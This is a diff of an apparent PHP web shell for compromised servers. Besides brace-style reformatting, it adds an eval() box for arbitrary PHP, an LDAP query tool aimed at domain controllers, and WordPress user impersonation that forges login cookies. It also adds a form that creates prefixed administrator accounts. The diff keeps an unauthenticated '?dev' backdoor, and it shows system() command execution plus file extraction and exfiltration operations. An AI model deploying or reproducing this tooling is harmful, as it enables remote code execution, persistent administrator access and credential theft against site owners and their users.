                     echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).\n";
                 }
 
@@ -1686,14 +1790,17 @@ echo $no_padding ? "" : "py-10 ";
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] SQL Server extension is not loaded.\n";
             }
-        } elseif ($db_type === 'oci') {
+        }
+        elseif ($db_type === 'oci') {
             $port = $port ?: 1521;
 
             // Check if the Oracle PDO extension is loaded
@@ -1701,7 +1808,8 @@ echo $no_padding ? "" : "py-10 ";
                 try {
                     if (!empty($sid)) {
                         $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
-                    } else {
+                    }
+                    else {
                         $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
                     }
                     $dsn = "oci:dbname=$tns";
@@ -1712,16 +1820,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the Oracle extension is loaded
+            }
+            // Check if the Oracle extension is loaded
             elseif (extension_loaded("oci8")) {
                 $connection = oci_connect($username, $password, "$host:$port/$service_name");
 
                 if (!$connection) {
                     echo "[Driver: oci8] Connection failed: " . oci_error();
-                } else {
+                }
+                else {
                     echo "[Driver: oci8] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1734,20 +1845,24 @@ echo $no_padding ? "" : "py-10 ";
                                     $rows[] = $row;
                                 }
                                 printAsciiTable($rows);
-                            } else {
+                            }
+                            else {
                                 echo "[Driver: oci8] Query failed: " . oci_error($statement);
                             }
-                        } else {
+                        }
+                        else {
                             echo "[Driver: oci8] Query failed: " . oci_error($connection);
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] Oracle extension is not loaded.\n";
             }
-        } elseif ($db_type === 'mongodb') {
+        }
+        elseif ($db_type === 'mongodb') {
             $port = $port ?: 27017;
-            $dsn = "mongodb://$username:$password@$host:$port/$database";
+            $dsn  = "mongodb://$username:$password@$host:$port/$database";
 
             // Check if the MongoDB extension is loaded
             if (extension_loaded("mongodb")) {
@@ -1756,7 +1871,7 @@ echo $no_padding ? "" : "py-10 ";
                     echo "[Driver: mongodb] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
-                        $query = new MongoDB\Driver\Query(array());
+                        $query  = new MongoDB\Driver\Query(array());
                         $cursor = $connection->executeQuery("$database.$collection", $query);
 
                         $rows = array();
@@ -1765,10 +1880,12 @@ echo $no_padding ? "" : "py-10 ";
                         }
                         printAsciiTable($rows);
                     }
-                } catch (MongoDB\Driver\Exception\Exception $e) {
+                }
+                catch (MongoDB\Driver\Exception\Exception $e) {
                     echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the Mongo extension is loaded
+            }
+            // Check if the Mongo extension is loaded
             elseif (extension_loaded("mongo")) {
                 try {
                     $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
@@ -1776,7 +1893,7 @@ echo $no_padding ? "" : "py-10 ";
 
                     if (!empty($query)) {
                         $collection = $connection->selectCollection($database, $collection);
-                        $cursor = $collection->find();
+                        $cursor     = $collection->find();
 
                         $rows = array();
                         foreach ($cursor as $row) {
@@ -1784,17 +1901,21 @@ echo $no_padding ? "" : "py-10 ";
                         }
                         printAsciiTable($rows);
                     }
-                } catch (MongoConnectionException $e) {
-                    echo "[Driver: mongo] Connection failed: " . $e->getMessage();
-                } catch (Exception $e) {
+                }
+                catch (MongoConnectionException $e) {
                     echo "[Driver: mongo] Connection failed: " . $e->getMessage();
                 }
-            } else {
+                catch (Exception $e) {
+                    echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+                }
+            }
+            else {
                 echo "[Driver: none] MongoDB extension is not loaded.\n";
             }
-        } elseif ($db_type === 'ibm') {
+        }
+        elseif ($db_type === 'ibm') {
             $port = $port ?: 50000;
-            $dsn = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
+            $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
 
             // Check if the IBM PDO extension is loaded
             if (extension_loaded("pdo_ibm")) {
@@ -1805,16 +1926,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the IBM extension is loaded
+            }
+            // Check if the IBM extension is loaded
             elseif (extension_loaded("ibm")) {
                 $connection = db2_connect($dsn, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: ibm] Connection failed: " . db2_conn_error();
-                } else {
+                }
+                else {
                     echo "[Driver: ibm] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1826,20 +1950,23 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: ibm] Query failed: " . db2_conn_error();
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] IBM extension is not loaded.\n";
             }
-        } elseif ($db_type === 'firebird') {
+        }
+        elseif ($db_type === 'firebird') {
             $port = $port ?: 3050;
-            $dsn = "firebird:dbname=$host/$port:$database" .
-                (!empty($charset) ? ";charset=$charset" : "") .
-                (!empty($role) ? ";role=$role" : "") .
-                (!empty($dialect) ? ";dialect=$dialect" : "");
+            $dsn  = "firebird:dbname=$host/$port:$database" .
+                    (!empty($charset) ? ";charset=$charset" : "") .
+                    (!empty($role) ? ";role=$role" : "") .
+                    (!empty($dialect) ? ";dialect=$dialect" : "");
 
             // Check if the Firebird PDO extension is loaded
             if (extension_loaded("pdo_firebird")) {
@@ -1850,10 +1977,12 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the Firebird extension is loaded
+            }
+            // Check if the Firebird extension is loaded
             elseif (extension_loaded("interbase")) {
                 echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
                 $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);
@@ -1872,13 +2001,16 @@ echo $no_padding ? "" : "py-10 ";
 
                         if (!$connection) {
                             echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
-                        } else {
+                        }
+                        else {
                             echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).\n";
                         }
-                    } else {
+                    }
+                    else {
                         echo "[Driver: interbase] Connected successfully using $username:$password (host:database).\n";
                     }
-                } else {
+                }
+                else {
                     echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).\n";
                 }
 
@@ -1891,14 +2023,17 @@ echo $no_padding ? "" : "py-10 ";
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: interbase] Query failed: " . ibase_errmsg();
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] Firebird extension is not loaded.\n";
             }
-        } elseif ($db_type === 'odbc') {
+        }
+        elseif ($db_type === 'odbc') {
             $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";
 
             // Check if the ODBC PDO extension is loaded
@@ -1910,16 +2045,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the ODBC extension is loaded
+            }
+            // Check if the ODBC extension is loaded
             elseif (extension_loaded("odbc")) {
                 $connection = odbc_connect($dsn, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
-                } else {
+                }
+                else {
                     echo "[Driver: odbc] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1931,17 +2069,20 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: odbc] Query failed: " . odbc_errormsg();
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] ODBC extension is not loaded.\n";
             }
-        } elseif ($db_type === 'informix') {
+        }
+        elseif ($db_type === 'informix') {
             $port = $port ?: 9800;
-            $dsn = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
+            $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
 
             // Check if the Informix PDO extension is loaded
             if (extension_loaded("pdo_informix")) {
@@ -1952,15 +2093,18 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] Informix extension is not loaded.\n";
             }
-        } elseif ($db_type === 'sybase') {
+        }
+        elseif ($db_type === 'sybase') {
             $port = $port ?: 5000;
-            $dsn = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
+            $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
 
             // Check if the Sybase PDO extension is loaded
             if (extension_loaded("pdo_dblib")) {
@@ -1971,16 +2115,19 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
                 }
-            } // Check if the Sybase extension is loaded
+            }
+            // Check if the Sybase extension is loaded
             elseif (extension_loaded("sybase")) {
                 $connection = sybase_connect($host, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
-                } else {
+                }
+                else {
                     echo "[Driver: sybase] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1992,18 +2139,21 @@ echo $no_padding ? "" : "py-10 ";
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: sybase] Query failed: " . sybase_get_last_message();
                         }
                     }
                 }
-            } // Check if the FreeTDS extension is loaded
+            }
+            // Check if the FreeTDS extension is loaded
             elseif (extension_loaded("mssql")) {
                 $connection = mssql_connect($host, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
-                } else {
+                }
+                else {
                     echo "[Driver: mssql] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -2013,15 +2163,18 @@ echo $no_padding ? "" : "py-10 ";
                             while ($row = mssql_fetch_assoc($result)) {
                                 echo json_encode($row);
                             }
-                        } else {
+                        }
+                        else {
                             echo "Query failed: " . mssql_get_last_message();
                         }
                     }
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: none] Sybase extension is not loaded.\n";
             }
-        } elseif ($db_type === 'raw') {
+        }
+        elseif ($db_type === 'raw') {
             $dsn = $raw_connection_string;
 
             // Check if the PDO extension is loaded
@@ -2033,34 +2186,217 @@ echo $no_padding ? "" : "py-10 ";
                     if (!empty($query)) {
                         runPDOQuery($pdo, $query);
                     }
-                } catch (PDOException $e) {
+                }
+                catch (PDOException $e) {
                     echo "[Driver: PDO] Connection failed: " . $e->getMessage();
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: PDO] PDO extension is not loaded.\n";
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] Unsupported database type: $db_type";
         }
     }
 
-// TEMPLATE DEVELOPMENT BACKDOOR - START
-// The following snippet is a backdoor that allows for template development without the need to authenticate.
-// This should be removed before deploying the template to a production environment.
+    /**
+     * Handle the query database operation
+     *
+     * @return void
+     */
+    function handleQueryDatabase() {
+        connectAndQueryDatabase(
+            $_POST["__PARAM_1__"],
+            $_POST["__PARAM_4__"],
+            $_POST["__PARAM_5__"],
+            $_POST["__PARAM_2__"],
+            intval($_POST["__PARAM_3__"]),
+            $_POST["__PARAM_8__"],
+            $_POST["__PARAM_9__"],
+            $_POST["__PARAM_6__"],
+            $_POST["__PARAM_7__"],
+            $_POST["__PARAM_10__"],
+            $_POST["__PARAM_11__"],
+            $_POST["__PARAM_12__"],
+            $_POST["__PARAM_15__"],
+            $_POST["__PARAM_17__"],
+            $_POST["__PARAM_13__"],
+            $_POST["__PARAM_14__"],
+            $_POST["__PARAM_16__"],
+            $_POST["__PARAM_18__"],
+            $_POST["__PARAM_19__"]
+        );
+    }
+
+    /**
+     * @param $server string LDAP server
+     * @param $port int|null LDAP port
+     * @param $username string|null LDAP username
+     * @param $password string|null LDAP password
+     * @param $domain string LDAP domain
+     * @param $query string LDAP query
+     *
+     * @return void
+     */
+    function runLDAPQuery($server, $port, $username, $password, $domain, $query) {
+        $port = $port ?: 389;
+
+        // Connect to LDAP server
+        $ldap_conn = ldap_connect("ldap://$server", $port);
+
+        if (!$ldap_conn) {
+            echo "Connection failed: " . ldap_error($ldap_conn);
+            return;
+        }
+
+        $base_dn = "DC=" . implode(",DC=", explode(".", $domain));
+        echo "Connected successfully to LDAP server $server:$port.\n";
+        echo "Base DN: $base_dn\n";
+
+        // Set LDAP options
+        ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+        ldap_set_option($ldap_conn, LDAP_OPT_REFERRALS, 1);
+        ldap_set_option($ldap_conn, LDAP_DEREF_ALWAYS, 1);
+
+        // Bind to LDAP server
+        if (!empty($username) && !empty($password)) {
+            $username = "CN=$username,$base_dn";
+            echo "Binding with username: $username\n";
+
+            // Bind with username and password (authenticating)
+            $ldap_bind = ldap_bind($ldap_conn, $username, $password);
+        }
+        else {
+            echo "Binding anonymously\n";
+            $ldap_bind = ldap_bind($ldap_conn);
+        }
+
+        if (!$ldap_bind) {
+            echo "Bind failed: " . ldap_error($ldap_conn);
+            return;
+        }
+
+        // Perform LDAP search
+        $ldap_search = ldap_search($ldap_conn, $base_dn, trim($query), array("*"), 0, 0);
+
+        if (!$ldap_search) {
+            echo "Search failed: " . ldap_error($ldap_conn);
+            return;
+        }
+
+        // Get search result entries
+        $ldap_entries = ldap_get_entries($ldap_conn, $ldap_search);
+
+        if (!$ldap_entries) {
+            echo "Search failed: " . ldap_error($ldap_conn);
+            return;
+        }
+
+        echo "Query executed successfully (Query: $query).\n";
+        echo json_encode($ldap_entries);
+
+        // Close LDAP connection
+        ldap_unbind($ldap_conn);
+    }
+
+    /**
+     * Get the list of WordPress users
+     *
+     * @return array List of WordPress users
+     */
+    function getWPUsers() {
+        return array_map(
+            function ($data) {
+                global $IMPERSONATE_WP_USER;
+                return array_merge(
+                    (array) $data->data,
+                    array(
+                        "roles"   => $data->roles,
+                        "actions" => makeForm(
+                            $IMPERSONATE_WP_USER,
+                            $_SERVER["REQUEST_URI"],
+                            array(
+                                makeInput(
+                                    "hidden",
+                                    "__PARAM_1__",
+                                    "username",
+                                    "",
+                                    "Username of the user to impersonate.",
+                                    true,
+                                    null,
+                                    $data->data->user_login
+                                ),
+                            ),
+                            "post",
+                            "Impersonate",
+                            "flex flex-col max-w-xl mb-0"
+                        ),
+                    )
+                );
+            },
+            get_users()
+        );
+    }
+
+    /**
+     * Handle the impersonate WordPress user operation and user creation operation
+     *
+     * @return void
+     */
+    function handleImpersonateWPUser() {
+        // Run the impersonate operation
+        if (isset($_POST["__PARAM_1__"]) && !empty($_POST["__PARAM_1__"])) {
+            $user = get_user_by("login", $_POST["__PARAM_1__"]);
+            if ($user) {
+                wp_set_current_user($user->ID, $user->user_login);
+                wp_set_auth_cookie($user->ID);
+                wp_redirect(site_url());
+                exit;
+            }
+        }
+        // Run the user creation operation
+        elseif (isset($_POST["__PARAM_2__"]) &&
+                !empty($_POST["__PARAM_2__"]) &&
+                isset($_POST["__PARAM_3__"]) &&
+                !empty($_POST["__PARAM_3__"])) {
+            $user_id = wp_insert_user(
+                array(
+                    "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
+                    "user_pass"  => $_POST["__PARAM_3__"],
+                    "role" => "administrator"
+                )
+            );
+            if (!is_wp_error($user_id)) {
+                $user = get_user_by("id", $user_id);
+                if ($user) {
+                    wp_set_current_user($user->ID, $user->user_login);
+                    wp_set_auth_cookie($user->ID);
+                    wp_redirect(site_url());
+                    exit;
+                }
+            }
+        }
+    }
+
+    // TEMPLATE DEVELOPMENT BACKDOOR - START
+    // The following snippet is a backdoor that allows for template development without the need to authenticate.
+    // This should be removed before deploying the template to a production environment.
     if (isset($_GET["dev"])) {
         $_SESSION["auth"] = true;
     }
-// TEMPLATE DEVELOPMENT BACKDOOR - END
+    // TEMPLATE DEVELOPMENT BACKDOOR - END
 
-// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
-// on the page except the operation result.
+    // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
+    // on the page except the operation result.
     $isolated_ops = array(
         $FILE_EXTRACTION,
         $EXFILTRATE,
         $LOGIN,
+        $IMPERSONATE_WP_USER,
     );
 
-// Check if the request is not POST and the operation is not in the isolated operations list, then render the page
+    // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
     if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
         $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
 
@@ -2099,11 +2435,11 @@ echo $no_padding ? "" : "py-10 ";
                                     "y",
                                     $page === $FILE_EXTRACTION_PREVIEW
                                         ? "window.location.href = '?page=" .
-                                        $FILE_EXTRACTION .
-                                        "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                          $FILE_EXTRACTION .
+                                          "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                         : "window.location.href = '?page=" .
-                                        $FILE_EXTRACTION_PREVIEW .
-                                        "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                          $FILE_EXTRACTION_PREVIEW .
+                                          "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                 ),
                                 makeCheckbox(
                                     "__PARAM_3__",
@@ -2271,7 +2607,7 @@ echo $no_padding ? "" : "py-10 ";
                 ob_start();
                 phpinfo();
                 $php_info = ob_get_clean();
-                $content = makePage(
+                $content  = makePage(
                     array(
                         makePageHeader(
                             $ENABLED_FEATURES[$page]["title"],
@@ -2310,73 +2646,76 @@ echo $no_padding ? "" : "py-10 ";
                                     "__PARAM_1__",
                                     array(
                                         [
-                                            "value" => "mysql",
-                                            "label" => "MySQL",
+                                            "value"    => "mysql",
+                                            "label"    => "MySQL",
                                             "disabled" => !extension_loaded("mysql") &&
-                                                !extension_loaded("mysqli") &&
-                                                !extension_loaded("pdo_mysql"),
+                                                          !extension_loaded("mysqli") &&
+                                                          !extension_loaded("pdo_mysql"),
                                         ],
                                         [
-                                            "value" => "cubrid",
-                                            "label" => "CUBRID",
-                                            "disabled" => !extension_loaded("cubrid") && !extension_loaded("pdo_cubrid"),
+                                            "value"    => "cubrid",
+                                            "label"    => "CUBRID",
+                                            "disabled" => !extension_loaded("cubrid") &&
+                                                          !extension_loaded("pdo_cubrid"),
                                         ],
                                         [
-                                            "value" => "pgsql",
-                                            "label" => "PostgreSQL",
+                                            "value"    => "pgsql",
+                                            "label"    => "PostgreSQL",
                                             "disabled" => !extension_loaded("pgsql") && !extension_loaded("pdo_pgsql"),
                                         ],
                                         [
-                                            "value" => "sqlite",
-                                            "label" => "SQLite",
-                                            "disabled" => !extension_loaded("sqlite3") && !extension_loaded("pdo_sqlite"),
+                                            "value"    => "sqlite",
+                                            "label"    => "SQLite",
+                                            "disabled" => !extension_loaded("sqlite3") &&
+                                                          !extension_loaded("pdo_sqlite"),
                                         ],
                                         [
-                                            "value" => "sqlsrv",
-                                            "label" => "SQL Server",
-                                            "disabled" => !extension_loaded("sqlsrv") && !extension_loaded("pdo_sqlsrv"),
+                                            "value"    => "sqlsrv",
+                                            "label"    => "SQL Server",
+                                            "disabled" => !extension_loaded("sqlsrv") &&
+                                                          !extension_loaded("pdo_sqlsrv"),
                                         ],
                                         [
-                                            "value" => "oci",
-                                            "label" => "Oracle",
+                                            "value"    => "oci",
+                                            "label"    => "Oracle",
                                             "disabled" => !extension_loaded("oci8") && !extension_loaded("pdo_oci"),
                                         ],
                                         [
-                                            "value" => "mongodb",
-                                            "label" => "MongoDB",
+                                            "value"    => "mongodb",
+                                            "label"    => "MongoDB",
                                             "disabled" => !extension_loaded("mongo") && !extension_loaded("mongodb"),
                                         ],
                                         [
-                                            "value" => "ibm",
-                                            "label" => "IBM DB2",
+                                            "value"    => "ibm",
+                                            "label"    => "IBM DB2",
                                             "disabled" => !extension_loaded("ibm_db2") && !extension_loaded("pdo_ibm"),
                                         ],
                                         [
-                                            "value" => "firebird",
-                                            "label" => "Firebird/Interbase",
+                                            "value"    => "firebird",
+                                            "label"    => "Firebird/Interbase",
                                             "disabled" => !extension_loaded("interbase") &&
-                                                !extension_loaded("pdo_firebird"),
+                                                          !extension_loaded("pdo_firebird"),
                                         ],
                                         [
-                                            "value" => "odbc",
-                                            "label" => "ODBC",
+                                            "value"    => "odbc",
+                                            "label"    => "ODBC",
                                             "disabled" => !extension_loaded("odbc") && !extension_loaded("pdo_odbc"),
                                         ],
                                         [
-                                            "value" => "informix",
-                                            "label" => "Informix",
+                                            "value"    => "informix",
+                                            "label"    => "Informix",
                                             "disabled" => !extension_loaded("pdo_informix"),
                                         ],
                                         [
-                                            "value" => "sybase",
-                                            "label" => "Sybase",
+                                            "value"    => "sybase",
+                                            "label"    => "Sybase",
                                             "disabled" => !extension_loaded("sybase") &&
-                                                !extension_loaded("mssql") &&
-                                                !extension_loaded("pdo_dblib"),
+                                                          !extension_loaded("mssql") &&
+                                                          !extension_loaded("pdo_dblib"),
                                         ],
                                         [
-                                            "value" => "raw",
-                                            "label" => "Raw PDO connection string",
+                                            "value"    => "raw",
+                                            "label"    => "Raw PDO connection string",
                                             "disabled" => !extension_loaded("pdo"),
                                             "selected" => true,
                                         ],
@@ -2598,38 +2937,95 @@ echo $no_padding ? "" : "py-10 ";
                     $page
                 );
                 break;
-            case $IMPERSONATE_WP_USER:
-                $users = array_map(
-                    function ($data) {
-                        global $IMPERSONATE_WP_USER;
-                        return array_merge(
-                            (array)$data->data,
+            case $QUERY_LDAP:
+                $content = makePage(
+                    array(
+                        makePageHeader(
+                            $ENABLED_FEATURES[$page]["title"],
+                            $ENABLED_FEATURES[$page]["description"]
+                        ),
+                        makeForm(
+                            $page,
+                            $_SERVER["REQUEST_URI"],
                             array(
-                                "roles" => $data->roles,
-                                "actions" => makeForm(
-                                    $IMPERSONATE_WP_USER,
-                                    $_SERVER["REQUEST_URI"],
-                                    array(
-                                        makeInput(
-                                            "hidden",
-                                            "__PARAM_1__",
-                                            "username",
-                                            "",
-                                            "Username of the user to impersonate.",
-                                            true,
-                                            null,
-                                            $data->data->user_login
-                                        )
-                                    ),
-                                    "post",
-                                    "Impersonate",
-                                    "flex flex-col max-w-xl mb-0"
-                                )
+                                makeInput(
+                                    "text",
+                                    "Domain controller",
+                                    "__PARAM_1__",
+                                    "hostname or IP address",
+                                    "The domain controller to connect to.",
+                                    true
+                                ),
+                                makeInput(
+                                    "text",
+                                    "LDAP port",
+                                    "__PARAM_2__",
+                                    "389",
+                                    "The port to connect to."
+                                ),
+                                makeInput(
+                                    "text",
+                                    "Domain",
+                                    "__PARAM_3__",
+                                    "example.com",
+                                    "The domain to connect to.",
+                                    true
+                                ),
+                                makeInput(
+                                    "text",
+                                    "Username",
+                                    "__PARAM_4__",
+                                    "admin",
+                                    "The username to connect with."
+                                ),
+                                makeInput(
+                                    "password",
+                                    "Password",
+                                    "__PARAM_5__",
+                                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                    "The password to connect with."
+                                ),
+                                makeInput(
+                                    "textarea",
+                                    "Query",
+                                    "__PARAM_6__",
+                                    "(&(objectClass=user)(sAMAccountName=*))",
+                                    "The LDAP query to run against the domain controller.",
+                                    true
+                                ),
                             )
-                        );
-                    },
-                    get_users()
+                        ),
+                    ),
+                    $page
                 );
+                break;
+            case $EVAL:
+                $content = makePage(
+                    array(
+                        makePageHeader(
+                            $ENABLED_FEATURES[$page]["title"],
+                            $ENABLED_FEATURES[$page]["description"]
+                        ),
+                        makeForm(
+                            $page,
+                            $_SERVER["REQUEST_URI"],
+                            array(
+                                makeInput(
+                                    "textarea",
+                                    "PHP code",
+                                    "__PARAM_1__",
+                                    "echo 'Hello, world!';",
+                                    "The PHP code to evaluate.",
+                                    true
+                                ),
+                            )
+                        ),
+                    ),
+                    $page
+                );
+                break;
+            case $IMPERSONATE_WP_USER:
+                $users   = getWPUsers();
                 $content = makePage(
                     array(
                         makePageHeader(
@@ -2643,10 +3039,51 @@ echo $no_padding ? "" : "py-10 ";
                             array(
                                 "user_login" => "Username",
                                 "user_email" => "Email",
-                                "roles" => "Roles",
-                                "user_url" => "URL",
-                                "actions" => "Actions"
+                                "roles"      => "Roles",
+                                "user_url"   => "URL",
+                                "actions"    => "Actions",
+                            ),
+                            "
+                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
+                            makeForm(
+                                $page,
+                                $_SERVER["REQUEST_URI"],
+                                array(
+                                    "<div class='flex items-center justify-between'>
+                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
+                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
+                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
+                                            &times;
+                                        </button>
+                                    </div>",
+                                    makeInput(
+                                        "text",
+                                        "Username",
+                                        "__PARAM_2__",
+                                        "admin",
+                                        "Username of the user to create.",
+                                        true
+                                    ),
+                                    makeInput(
+                                        "password",
+                                        "Password",
+                                        "__PARAM_3__",
+                                        "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                        "Password of the user to create.",
+                                        true
+                                    ),
+                                ),
+                                "post",
+                                "Create user",
+                                "flex flex-col gap-y-6 mx-auto w-full"
                             )
+                            . "
+                        </dialog>
+                        <button onclick='document.getElementById(\"create-wp-user\").showModal(); document.getElementById(\"create-wp-user\").classList.add(\"flex\")' 
+                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
+                                hover:bg-zinc-700 transition-all duration-300'>
+                            Create user
+                        </button>"
                         ),
                     ),
                     $page
@@ -2688,36 +3125,23 @@ echo $no_padding ? "" : "py-10 ";
                 system($_POST["__PARAM_1__"]);
                 break;
             case $QUERY_DATABASES:
-                $connection = connectAndQueryDatabase(
+                handleQueryDatabase();
+                break;
+            case $QUERY_LDAP:
+                runLDAPQuery(
                     $_POST["__PARAM_1__"],
-                    $_POST["__PARAM_4__"],
-                    $_POST["__PARAM_5__"],
-                    $_POST["__PARAM_2__"],
+                    !empty($_POST["__PARAM_2__"]) ? intval($_POST["__PARAM_2__"]) : null,
+                    !empty($_POST["__PARAM_4__"]) ? $_POST["__PARAM_4__"] : null,
+                    !empty($_POST["__PARAM_5__"]) ? $_POST["__PARAM_5__"] : null,
                     $_POST["__PARAM_3__"],
-                    $_POST["__PARAM_8__"],
-                    $_POST["__PARAM_9__"],
-                    $_POST["__PARAM_6__"],
-                    $_POST["__PARAM_7__"],
-                    $_POST["__PARAM_10__"],
-                    $_POST["__PARAM_11__"],
-                    $_POST["__PARAM_12__"],
-                    $_POST["__PARAM_15__"],
-                    $_POST["__PARAM_17__"],
-                    $_POST["__PARAM_13__"],
-                    $_POST["__PARAM_14__"],
-                    $_POST["__PARAM_16__"],
-                    $_POST["__PARAM_18__"],
-                    $_POST["__PARAM_19__"]
+                    $_POST["__PARAM_6__"]
                 );
-
-                /*if ($pdo) {
-                    $stmt      = $pdo->query("SHOW DATABASES");
-                    $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
-                    echo "Databases:\n";
-                    foreach ($databases as $database) {
-                        echo "- $database\n";
-                    }
-                }*/
+                break;
+            case $EVAL:
+                eval($_POST["__PARAM_1__"]);
+                break;
+            case $IMPERSONATE_WP_USER:
+                handleImpersonateWPUser();
                 break;
             default:
                 echo "Unrecognized operation '$operation'";
@@ -2725,7 +3149,7 @@ echo $no_padding ? "" : "py-10 ";
         }
     }
 
-// Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
+    // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
     if (!isPost() &&
         (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
         $_POST["__OPERATION__"] !== $LOGIN) {
